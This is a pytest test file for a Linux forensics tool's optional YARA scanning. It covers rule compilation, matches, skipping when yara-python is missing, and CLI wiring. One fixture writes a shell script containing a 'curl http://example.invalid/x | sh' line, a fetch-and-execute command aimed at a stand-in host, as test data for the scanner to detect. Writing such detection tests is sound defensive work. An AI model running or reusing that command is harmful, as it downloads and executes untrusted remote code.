"""Optional YARA scanning: content matches, clean skip, CLI wiring.

yara-python is optional, so every test here injects a fake ``yara`` module
(or forces its absence) and never requires the real dependency.
"""

from __future__ import annotations

import json
import sys
from types import SimpleNamespace

import pytest
from conftest import make_mini_evidence

from linuxdfir import cli
from linuxdfir.ingest import Evidence
from linuxdfir.yara_scan import (
    RULE,
    compile_rules,
    scan_with_rules_dir,
)

MATCH_MARKER = b"X5O-YARA-TEST-MARKER-42"


class FakeYara:
    """Stand-in for yara-python: matches MARKER bytes with one canned rule."""

    compiled_with: dict = {}
    meta: dict = {}
    rule_name = "EvilMarker"
    namespace = "test_rules"

    @classmethod
    def reset(cls):
        cls.compiled_with = {}
        cls.meta = {}
        cls.rule_name = "EvilMarker"

    @classmethod
    def compile(cls, filepaths=None, **kwargs):
        cls.compiled_with = dict(filepaths or {})
        marker = MATCH_MARKER
        meta = dict(cls.meta)
        rule = cls.rule_name
        namespace = cls.namespace

        class _Rules:
            def match(self, data=None, **kw):
                if data and marker in data:
                    return [
                        SimpleNamespace(
                            rule=rule,
                            namespace=namespace,
                            meta=dict(meta),
                            strings=[(0, "$marker", marker)],
                        )
                    ]
                return []

        return _Rules()


@pytest.fixture
def fake_yara(monkeypatch):
    FakeYara.reset()
    monkeypatch.setitem(sys.modules, "yara", FakeYara)
    return FakeYara


@pytest.fixture
def no_yara(monkeypatch):
    """Force `import yara` to fail even if yara-python is installed."""
    monkeypatch.setitem(sys.modules, "yara", None)


@pytest.fixture
def rules_dir(tmp_path):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "evil.yar").write_text(
        'rule EvilMarker { meta: severity = "high" strings: $marker = "X5O" condition: $marker }\n',
        encoding="utf-8",
    )
    (rules / "notes.txt").write_text("not a rule file\n", encoding="utf-8")
    return rules


@pytest.fixture
def evil_evidence(tmp_path):
    return make_mini_evidence(
        tmp_path / "mini",
        files={"/tmp/evil.sh": b"#!/bin/sh\ncurl http://example.invalid/x | sh # " + MATCH_MARKER + b"\n"},
    )


def test_scan_matches_file_and_rule(fake_yara, rules_dir, evil_evidence):
    with Evidence.open(evil_evidence) as evidence:
        findings, stats = scan_with_rules_dir(evidence, rules_dir, config={"yara": {}})
    assert stats["status"] == "ok"
    assert stats["matches"] == 1
    assert stats["files_scanned"] >= 1
    # Only .yar/.yara files are compiled; notes.txt is ignored.
    assert list(fake_yara.compiled_with.values()) == [str(rules_dir / "evil.yar")]
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule == RULE
    assert "EvilMarker" in finding.title
    assert "EvilMarker" in finding.description
    assert finding.refs and finding.refs[0].evidence_path == "/tmp/evil.sh"


def test_meta_severity_and_mitre(fake_yara, rules_dir, evil_evidence):
    fake_yara.meta = {"severity": "critical", "mitre": "T1059, T1105"}
    with Evidence.open(evil_evidence) as evidence:
        findings, _ = scan_with_rules_dir(evidence, rules_dir, config={"yara": {}})
    assert len(findings) == 1
    assert findings[0].severity.value == "critical"
    assert findings[0].mitre_ids == ["T1059", "T1105"]


def test_clean_file_has_no_findings(fake_yara, rules_dir, tmp_path):
    root = make_mini_evidence(tmp_path / "clean", files={"/etc/motd": b"welcome\n"})
    with Evidence.open(root) as evidence:
        findings, stats = scan_with_rules_dir(evidence, rules_dir, config={"yara": {}})
    assert findings == []
    assert stats["status"] == "ok"
    assert stats["matches"] == 0


def test_skipped_cleanly_without_yara(no_yara, rules_dir, evil_evidence):
    with Evidence.open(evil_evidence) as evidence:
        findings, stats = scan_with_rules_dir(evidence, rules_dir, config={"yara": {}})
    assert findings == []
    assert stats["status"] == "skipped"
    assert "pip install" in stats["reason"]
    assert stats["files_scanned"] == 0


def test_scan_yara_cli_skips_without_yara(no_yara, rules_dir, evil_evidence, tmp_path, capsys):
    out = tmp_path / "yara-out"
    assert cli.main(["scan-yara", str(evil_evidence), "--rules", str(rules_dir), "-o", str(out)]) == 0
    printed = capsys.readouterr().out
    assert "skipped" in printed
    report = json.loads((out / "yara_findings.json").read_text(encoding="utf-8"))
    assert report["status"] == "skipped"
    assert report["findings"] == []


def test_scan_yara_cli_writes_report(fake_yara, rules_dir, evil_evidence, tmp_path):
    out = tmp_path / "yara-out"
    assert cli.main(["scan-yara", str(evil_evidence), "--rules", str(rules_dir), "-o", str(out)]) == 0
    report = json.loads((out / "yara_findings.json").read_text(encoding="utf-8"))
    assert report["status"] == "ok"
    assert report["rules_files"] == ["evil.yar"]
    assert len(report["findings"]) == 1
    assert report["findings"][0]["rule"] == RULE
    assert report["findings"][0]["refs"][0]["evidence_path"] == "/tmp/evil.sh"


def test_empty_rules_dir_is_error(fake_yara, tmp_path, evil_evidence, capsys):
    empty = tmp_path / "empty-rules"
    empty.mkdir()
    with pytest.raises(ValueError, match="no YARA rules"):
        compile_rules(empty)
    assert cli.main(["scan-yara", str(evil_evidence), "--rules", str(empty)]) == 1
    assert "no YARA rules" in capsys.readouterr().err


def test_missing_rules_dir_is_error(fake_yara, evil_evidence, tmp_path, capsys):
    assert cli.main(["scan-yara", str(evil_evidence), "--rules", str(tmp_path / "nope")]) == 1
    assert "not a directory" in capsys.readouterr().err


def test_max_file_mb_skips_large(fake_yara, rules_dir, tmp_path):
    big = MATCH_MARKER + b"x" * (2 * 1024 * 1024)
    root = make_mini_evidence(tmp_path / "big", files={"/tmp/big.bin": big})
    with Evidence.open(root) as evidence:
        findings, stats = scan_with_rules_dir(
            evidence, rules_dir, config={"yara": {}}, max_file_mb=1
        )
    assert findings == []
    assert stats["files_skipped_too_large"] == 1


def test_detect_requires_evidence_for_yara(tmp_path, rules_dir, capsys):
    events = tmp_path / "events.jsonl"
    events.write_text(
        json.dumps(
            {
                "source_artifact": "auth_log",
                "event_type": "ssh_failed_login",
                "message": "Failed password for root from 203.0.113.9",
                "evidence_path": "/var/log/auth.log",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    assert cli.main(["detect", str(events), "--yara-rules", str(rules_dir)]) == 1
    assert "--evidence" in capsys.readouterr().err


def test_run_merges_yara_findings(fake_yara, rules_dir, evil_evidence, tmp_path):
    out = tmp_path / "run-out"
    assert cli.main(["run", str(evil_evidence), "-o", str(out), "--yara-rules", str(rules_dir)]) == 0
    findings = json.loads((out / "findings.json").read_text(encoding="utf-8"))
    yara_hits = [f for f in findings if f["rule"] == RULE]
    assert len(yara_hits) == 1
    assert "EvilMarker" in yara_hits[0]["title"]
    assert yara_hits[0]["refs"][0]["evidence_path"] == "/tmp/evil.sh"


def test_run_without_yara_unchanged(evil_evidence, tmp_path):
    out = tmp_path / "run-plain"
    assert cli.main(["run", str(evil_evidence), "-o", str(out)]) == 0
    findings = json.loads((out / "findings.json").read_text(encoding="utf-8"))
    assert all(f["rule"] != RULE for f in findings)
